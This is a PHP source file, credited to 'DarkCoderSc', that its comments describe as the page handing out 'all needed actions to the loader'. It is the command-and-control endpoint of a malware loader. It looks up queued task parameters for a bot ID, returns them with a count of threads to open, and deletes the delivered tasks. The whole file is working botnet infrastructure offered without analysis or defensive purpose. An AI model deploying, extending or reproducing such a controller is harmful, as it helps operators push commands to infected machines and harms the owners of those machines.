<?php
		/*
				Author : DarkCoderSc
				This page will give all needed actions to the loader
				v1.2
		*/
		
		include('inc/connection.inc.php');
		
		/**
			Check if a uid was passed to the url
		*/
		if(isset($_GET['uid'])){
   		$sock = getDBSock(); // get new database socket
			$uid = mysql_real_escape_string($_GET['uid']); //Escape shit
			$sql = "SELECT params FROM vn_tasks WHERE uid='$uid'";
			$result = mysql_query($sql,$sock) or die(mysql_error());
			if(!$result) exit; // quit all this shit
			
			//{Init vars}
			$page = "";
			$count = 0; //actions counter
			
			/**
				Getting all task to accomplish for the loader
			*/
			while($data = mysql_fetch_array($result)) {
				$page .= $data['params'] . '|';
				$count++; //Inc it 
			}
			
			/**
				Then add the count of all this shit to know how many threads he need to open
			*/
			if($count > 0){
				$page = substr($page,0,strlen($page)-1); 
				echo $page.";".$count; //Now display tasks for loader reading
			}else{
				exit(); // don't go too far
			}
			
			/**
				Now deleting all tasks
			*/
			$sql = "DELETE FROM vn_tasks WHERE uid='$uid'";
			mysql_query($sql, $sock) or die(mysql_error()) ;
			
			mysql_close($sock);
		}
?>